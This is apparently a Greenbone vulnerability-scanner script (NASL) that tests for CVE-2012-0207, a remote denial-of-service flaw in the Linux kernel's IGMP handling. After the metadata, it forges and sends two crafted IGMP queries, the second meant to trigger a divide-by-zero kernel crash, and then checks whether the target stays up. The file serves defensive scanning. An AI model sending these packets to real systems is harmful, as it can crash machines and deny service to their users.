# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802295");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2012-0207");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-07-30 19:39:00 +0000 (Thu, 30 Jul 2020)");
  script_tag(name:"creation_date", value:"2012-01-19 14:14:14 +0530 (Thu, 19 Jan 2012)");
  script_name("Linux Kernel IGMP Remote DoS Vulnerability");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("global_settings.nasl", "os_detection.nasl");
  script_exclude_keys("keys/TARGET_IS_IPV6");
  script_mandatory_keys("Host/runs_unixoide");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47472");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51343");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18378");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1026526");
  script_xref(name:"URL", value:"http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=654876");
  script_xref(name:"URL", value:"http://womble.decadent.org.uk/blog/igmp-denial-of-service-in-linux-cve-2012-0207.html");
  script_xref(name:"URL", value:"http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=a8c1f65c79cbbb2f7da782d4c9d15639a9b94b27");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause a kernel crash,
  denying service to legitimate users.");

  script_tag(name:"affected", value:"Linux Kernels above or equal to 2.6.36.");

  script_tag(name:"insight", value:"The flaw is due to an error in IGMP protocol implementation, which
  can be exploited to cause a kernel crash via specially crafted IGMP queries.");

  script_tag(name:"solution", value:"Upgrade to Linux Kernel version 3.0.17, 3.1.9 or 3.2.1.");

  script_tag(name:"summary", value:"The Linux Kernel is prone to a remote denial of service (DoS)
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

# Ensure that the host is still up
start_denial();
sleep(2);
up = end_denial();

if(!up)
  exit(0);

dstaddr = get_host_ip();
srcaddr = this_host();

ip = forge_ip_packet( ip_v   : 4,
                      ip_hl  : 7,
                      ip_tos : 0,
                      ip_len : 20,
                      ip_off : 0,
                      ip_p   : IPPROTO_IGMP,
                      ip_id  : 18277,
                      ip_ttl : 1,
                      ip_src : srcaddr,
                      ip_dst : dstaddr);

igmp1 = forge_igmp_packet(ip    : ip,
                          type  : 0x11,
                          code  : 0xff,
                          group : 224.0.0.1);

start_denial();

## Send IGMPv2 query
result = send_packet(igmp1, pcap_active:FALSE);

igmp2 = forge_igmp_packet(ip    : ip,
                          type  : 0x11,
                          code  : 0x00,
                          group : 0.0.0.0,
                          data  : "haha",
                          update_ip_len : FALSE);

igmp2 = set_ip_elements(ip:igmp2, ip_len:28, ip_id:18278);

## Send IGMPv3 query which will trigger a divide by zero error
result = send_packet(igmp2, pcap_active:FALSE);
alive = end_denial();

if(! alive) {
  security_message(port:0);
}
